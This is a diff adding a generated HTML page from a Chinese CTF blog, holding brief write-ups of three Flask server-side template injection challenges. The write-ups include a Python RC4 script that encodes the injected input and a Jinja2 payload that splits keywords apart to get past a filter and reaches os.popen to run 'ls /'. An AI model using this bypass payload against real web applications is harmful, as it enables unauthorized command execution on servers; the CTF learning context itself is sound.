@@ -1,0 +1,748 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="August Rosenberg">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[HNCTF 2022 WEEK2]ez_SSTI0x00 模板注入 0x01 使用hackbar自带的 [NISACTF 2022]is secret0x00 这道题挺难的 使用的知识点  ssti  flask rce  0x01 首先  查找一圈只发现了  使用的框架 通过目录扫描 发现了secret 目录 0x02  发现通过get 传参的方式给他说秘密 然后我就随便说了一个  每理解到，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="flask">
+<meta property="og:url" content="https://tsy244.github.io/2024/05/09/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/flask/index.html">
+<meta property="og:site_name" content="AU9U5T">
+<meta property="og:description" content="[HNCTF 2022 WEEK2]ez_SSTI0x00 模板注入 0x01 使用hackbar自带的 [NISACTF 2022]is secret0x00 这道题挺难的 使用的知识点  ssti  flask rce  0x01 首先  查找一圈只发现了  使用的框架 通过目录扫描 发现了secret 目录 0x02  发现通过get 传参的方式给他说秘密 然后我就随便说了一个  每理解到，">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240131211818243.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203231956350.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203232019419.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203232125435.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203232308690.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203232510998.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203232523216.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203232535937.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203233709207.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203233719628.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240509221133531.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240509221328120.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240509221514955.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240509221716452.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240509221835118.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240509222214186.png">
+<meta property="article:published_time" content="2024-05-09T14:02:33.000Z">
+<meta property="article:modified_time" content="2024-05-09T14:30:50.208Z">
+<meta property="article:author" content="August Rosenberg">
+<meta property="article:tag" content="CTF刷题记录">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240131211818243.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>flask - AU9U5T</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tsy244.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":"G-BL1W5LRRDJ","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>AU9U5T&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="flask"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        August Rosenberg
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-05-09 22:02" pubdate>
+          May 9, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.7k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          15 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">flask</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="HNCTF-2022-WEEK2-ez-SSTI"><a href="#HNCTF-2022-WEEK2-ez-SSTI" class="headerlink" title="[HNCTF 2022 WEEK2]ez_SSTI"></a>[HNCTF 2022 WEEK2]ez_SSTI</h1><p>0x00</p>
+<p>模板注入</p>
+<p>0x01</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240131211818243.png" srcset="/img/loading.gif" lazyload alt="image-20240131211818243"><br>使用hackbar自带的</p>
+<h1 id="NISACTF-2022-is-secret"><a href="#NISACTF-2022-is-secret" class="headerlink" title="[NISACTF 2022]is secret"></a>[NISACTF 2022]is secret</h1><p>0x00</p>
+<p>这道题挺难的</p>
+<p>使用的知识点</p>
+<ul>
+<li>ssti  flask</li>
+<li>rce</li>
+</ul>
+<p>0x01</p>
+<p>首先</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203231956350.png" srcset="/img/loading.gif" lazyload alt="image-20240203231956350"></p>
+<p>查找一圈只发现了</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203232019419.png" srcset="/img/loading.gif" lazyload alt="image-20240203232019419"></p>
+<p>使用的框架</p>
+<p>通过目录扫描</p>
+<p>发现了secret 目录</p>
+<p>0x02</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203232125435.png" srcset="/img/loading.gif" lazyload alt="image-20240203232125435"></p>
+<p>发现通过get 传参的方式给他说秘密</p>
+<p>然后我就随便说了一个</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203232308690.png" srcset="/img/loading.gif" lazyload alt="image-20240203232308690"></p>
+<p>每理解到，尝试判断是否存在模板注入</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203232510998.png" srcset="/img/loading.gif" lazyload alt="image-20240203232510998"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203232523216.png" srcset="/img/loading.gif" lazyload alt="image-20240203232523216"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203232535937.png" srcset="/img/loading.gif" lazyload alt="image-20240203232535937"></p>
+<p>0x03</p>
+<p>使用下面的脚本进行rc4加密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_main</span>(<span class="hljs-params">key=<span class="hljs-string">&quot;init_key&quot;</span>, message=<span class="hljs-string">&quot;init_message&quot;</span></span>):  <span class="hljs-comment"># 返回加密后得内容</span><br>    s_box = rc4_init_sbox(key)<br>    crypt = <span class="hljs-built_in">str</span>(rc4_excrypt(message, s_box))<br>    <span class="hljs-keyword">return</span> crypt<br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_init_sbox</span>(<span class="hljs-params">key</span>):<br>    s_box = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s_box[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) % <span class="hljs-number">256</span><br>        s_box[i], s_box[j] = s_box[j], s_box[i]<br>    <span class="hljs-keyword">return</span> s_box<br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_excrypt</span>(<span class="hljs-params">plain, box</span>):<br>    res = []<br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> plain:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + box[i]) % <span class="hljs-number">256</span><br>        box[i], box[j] = box[j], box[i]<br>        t = (box[i] + box[j]) % <span class="hljs-number">256</span><br>        k = box[t]<br>        res.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s) ^ k))<br>    cipher = <span class="hljs-string">&quot;&quot;</span>.join(res)<br>    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">str</span>(base64.b64encode(cipher.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)), <span class="hljs-string">&#x27;utf-8&#x27;</span>))<br> <br> <br>key = <span class="hljs-string">&quot;HereIsTreasure&quot;</span>  <span class="hljs-comment"># 此处为密文</span><br>message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入明文:\n&quot;</span>)<br>enc_base64 = rc4_main(key, message)<br>enc_init = <span class="hljs-built_in">str</span>(base64.b64decode(enc_base64), <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>enc_url = parse.quote(enc_init)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;rc4加密后的url编码:&quot;</span> + enc_url)<br><span class="hljs-comment"># print(&quot;rc4加密后的base64编码&quot;+enc_base64)</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203233709207.png" srcset="/img/loading.gif" lazyload alt="image-20240203233709207"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203233719628.png" srcset="/img/loading.gif" lazyload alt="image-20240203233719628"></p>
+<h1 id="NCTF-2018-flask真香"><a href="#NCTF-2018-flask真香" class="headerlink" title="[NCTF 2018]flask真香"></a>[NCTF 2018]flask真香</h1><p><strong>0x00</strong></p>
+<p>使用的知识点</p>
+<ol>
+<li><p>flask 模板注入字符串拼接绕过</p>
+</li>
+<li><p>python 中的魔术方法</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44604541/article/details/109048578">SSTI详解 一文了解SSTI和所有常见payload 以flask模板为例-CSDN博客</a></p>
+</blockquote>
+</li>
+</ol>
+<p><strong>0x01</strong></p>
+<p>第一步找注入点</p>
+<ol>
+<li><p>f12 查找发现没有什么东西</p>
+</li>
+<li><p>然后找</p>
+<p>发现了自己写的错误页面，觉得非常可疑</p>
+<p>使用payload 尝试</p>
+<blockquote>
+49
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240509221133531.png" srcset="/img/loading.gif" lazyload alt="image-20240509221133531"></p>
+</li>
+</ol>
+<p><strong>0x02</strong></p>
+<p>既然发现了注入点尝试使用</p>
+<blockquote>
+<p>“”.__class__测试一下</p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240509221328120.png" srcset="/img/loading.gif" lazyload alt="image-20240509221328120"></p>
+<p>发现url 没有了</p>
+<p>尝试其他的方式</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240509221514955.png" srcset="/img/loading.gif" lazyload alt="image-20240509221514955"></p>
+<p>使用字符串拼接进行绕过</p>
+<p><strong>0x03</strong></p>
+<p>查找可以使用的class</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240509221716452.png" srcset="/img/loading.gif" lazyload alt="image-20240509221716452"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240509221835118.png" srcset="/img/loading.gif" lazyload alt="image-20240509221835118"></p>
+<p><strong>0x04</strong></p>
+<ol>
+<li><h3 id="lt-class-‘os-wrap-close’-gt"><a href="#lt-class-‘os-wrap-close’-gt" class="headerlink" title="&lt;class ‘os._wrap_close’&gt;"></a>&lt;class ‘os._wrap_close’&gt;</h3><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&#x27;__cl&#x27;</span>+<span class="hljs-string">&#x27;ass__&#x27;</span>].<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;__subcl&#x27;</span>+<span class="hljs-string">&#x27;asses__&#x27;</span>]()[<span class="hljs-number">383</span>].<span class="hljs-symbol">__init__</span>.<span class="hljs-symbol">__globals__</span>[<span class="hljs-string">&#x27;__bui&#x27;</span>+<span class="hljs-string">&#x27;ltins__&#x27;</span>][<span class="hljs-string">&#x27;ev&#x27;</span>+<span class="hljs-string">&#x27;al&#x27;</span>](<span class="hljs-string">&quot;__im&quot;</span>+<span class="hljs-string">&quot;port__(&#x27;o&#x27;+&#x27;s&#x27;).po&quot;</span>+<span class="hljs-string">&quot;pen(&#x27;ls /&#x27;).read()&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240509222214186.png" srcset="/img/loading.gif" lazyload alt="image-20240509222214186"></li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">#CTF刷题记录</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>flask</div>
+      <div>https://tsy244.github.io/2024/05/09/CTF刷题记录/WEB/flask/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>August Rosenberg</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>May 9, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/05/09/%E6%95%B4%E7%90%86/csrf/" title="csrf">
+                        <span class="hidden-mobile">csrf</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/TSY244?tab=repositories" target="_blank" rel="nofollow noopener"><span>github</span></a> <i class="iconfont icon-love"></i> <a href="https://august244.github.io/" target="_blank" rel="nofollow noopener"><span>随笔</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
